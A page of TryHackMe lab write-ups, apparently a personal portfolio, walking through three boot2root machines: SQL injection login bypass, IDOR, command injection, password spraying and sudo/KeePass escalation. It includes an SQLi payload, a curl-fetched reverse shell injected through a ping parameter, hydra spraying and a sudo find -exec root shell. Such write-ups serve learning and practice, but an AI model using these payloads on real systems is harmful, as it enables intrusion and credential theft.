TryHackMe — Operation Promotion

Linux boot2root built around a recruitment portal. SQL injection for admin access, IDOR to enumerate users, command injection via a hidden ping utility, contextual password generation to pivot to a privileged user, and a sudo misconfiguration on find for root. 2 / 2 flags.

TryHackMe Easy 2 / 2 Flags Linux Boot2Root

// 01 — recon

Nmap revealed four open ports: SSH (22), Apache HTTP (80), and Samba SMB (139/445). The HTTP server header identified a site called "RecruitCorp - Careers Portal". Crucially, robots.txt advertised a disallowed path — /admin/ — which immediately became a target.

nmap -sC -sV -p- <target-ip>

Gobuster confirmed /admin (301), /config (403), and /server-status (403). The 403 on /config suggested sensitive content protected from the browser but readable from the server itself.

// 02 — SQL injection → admin access

The /admin/ login form was vulnerable to a basic auth-bypass injection. The app concatenated user input directly into the SQL query with no parameterisation:

SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...'

Submitting ' OR 1=1-- bypassed authentication entirely.

SQLiAuth Bypass

// 03 — IDOR → user enumeration

The admin dashboard exposed a User Lookup feature at /admin/users/lookup.php?id=. IDs were sequential integers — iterating 1 through 9 returned all employee records. User ID 7 was the key find:

Username: sysmaint Role: system Notes: Service account for /admin/sysmaint-checks/ping.php. Do not disable.

The notes field directly disclosed a hidden internal endpoint.

IDORInformation Disclosure

// 04 — command injection → reverse shell

/admin/sysmaint-checks/ping.php passed the host parameter directly to shell_exec() — the source even contained the comment // VULN: unsanitised input passed directly to shell. The ; separator worked with no filtering.

Hosted a bash reverse shell and fetched it via curl injection (two-step to avoid special character issues in the URL):

# Step 1 — fetch shell script ?host=10.x.x.x;curl+http://<attacker>/shell.sh+-o+/tmp/s.sh # Step 2 — execute ?host=10.x.x.x;bash+/tmp/s.sh

Reverse shell received as www-data.

Command Injectionshell_exec()RCE

// 05 — local enumeration → credentials

The /config directory was accessible from the shell. It contained the database connection config with a bcrypt hash for jford — too slow to crack via rockyou. The SQLite database at /var/lib/recruitcorp/app.db contained plaintext passwords for all web app users but not for jford, who existed only as a system account.

cat /var/www/html/config/* python3 -c "import sqlite3; conn=sqlite3.connect('/var/lib/recruitcorp/app.db'); [print(row) for row in conn.execute('SELECT * FROM users')]"
Cleartext CredentialsConfig File Exposure

// 06 — contextual wordlist → user flag

The main page prominently featured "Spring 2026 Hiring Drive" — a contextual clue. Rather than brute forcing with rockyou, a targeted wordlist was built using Spring2026 as the seed and hashcat mutation rules to generate variations. Hydra sprayed the wordlist against SSH for jford:

echo 'Spring2026' > spring.txt hashcat --stdout spring.txt -r /path/to/rules/best64.rule > wordlist.txt hydra -l jford -P wordlist.txt <target-ip> ssh
[22][ssh] host: <target> login: jford password: spring2026!

SSH'd in as jford. User flag retrieved from home directory.

Contextual WordlistHashcat RulesPassword Spray

// 07 — sudo find → root flag

sudo -l revealed jford could run /usr/bin/find as root with no password. The find binary supports an -exec flag that executes arbitrary commands — a well-known GTFObins escalation path:

sudo find . -exec /bin/bash \; -quit

Instant root shell. Root flag retrieved from /root/.

Sudo MisconfigurationGTFObinsfind -exec

// attack chain

—SQLi login bypass → admin dashboard
—IDOR on user lookup → hidden ping endpoint discovered via user notes
—Command injection via ping.php → reverse shell as www-data
—Config file + SQLite DB enumeration → credential harvest
F1Contextual wordlist (Spring2026 + hashcat rules) → jford:spring2026! → SSH → user flag
F2sudo find with -exec → root shell → root flag

TryHackMe — Dead Drop

Multi-stage Windows Active Directory engagement. Entry through a vulnerable Node.js file-sharing app, lateral movement via APK analysis, SOCKS pivot into a segmented internal network, and domain compromise through a nested group ACL misconfiguration. Full domain admin.

TryHackMe Hard Full DA Windows AD Boot2Root Pivoting

// 02 — SQL injection → login bypass

The login form was vulnerable to a basic auth-bypass injection. Submitting ' OR 1=1-- as the username bypassed authentication entirely, logging in as admin.

SQLiAuth Bypass

// 03 — Node.js RCE → reverse shell

The dashboard exposed a file upload feature. The server executed .js files server-side when previewed — Server-Side JavaScript Injection. Uploaded a Node.js reverse shell using child_process and net modules. Shell received as www-data.

SSJIRCEFile Upload

SQLite database contained two plaintext accounts. shadow.bak held a SHA-512 hash for svc-drop — cracked offline with john + rockyou: dropsofjupiter. SSH'd in as svc-drop.

Company Android APK found in svc-drop's home. Extracted strings from compiled Dalvik bytecode. The Config class contained hardcoded domain credentials: j.harris:DropsOfJupiter2026!.

Hardcoded CredentialsAPK Analysis

DC was not directly reachable. Set up SSH SOCKS5 proxy through the compromised host and routed tools via proxychains. All key Windows/AD ports confirmed open on the DC.

TryHackMe — Silent Monitor

Linux boot2root built around a Flask NOC portal. SQL injection for initial access, newline-based command injection to escape a filtered ping utility, credential hunting in app source and config files, and offline KeePass cracking to recover the root password. 2 / 2 flags.

TryHackMe Medium 2 / 2 Flags Linux Boot2Root

// 01 — recon

Nmap revealed SSH (22) and a Werkzeug/Flask app on port 5050 — "CorpNet Network Operations Centre". Gobuster found a single endpoint: /internal.

// 02 — SQL injection & command injection

SQLi bypassed the login form. The dashboard's Host Health Check ran ping via subprocess(shell=True). The filter blocked common separators but not newlines — injecting %0a via Burp terminated ping and executed arbitrary commands as www-data.

SQLiCommand InjectionNewline Bypass

// 03 — credential hunting → user flag

secret.config contained plaintext backup agent credentials for sysadmin. SSH succeeded. User flag retrieved.

Cleartext CredentialsConfig File Exposure

// 04 — KeePass cracking → root flag

infrastructure.kdbx found in sysadmin's home. Cracked master password offline with john: spring. Extracted root password. su root succeeded. Root flag retrieved.

keepass2john infrastructure.kdbx > keepass.hash john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt keepassxc-cli show -s infrastructure.kdbx "Root User Password - Sensitive"
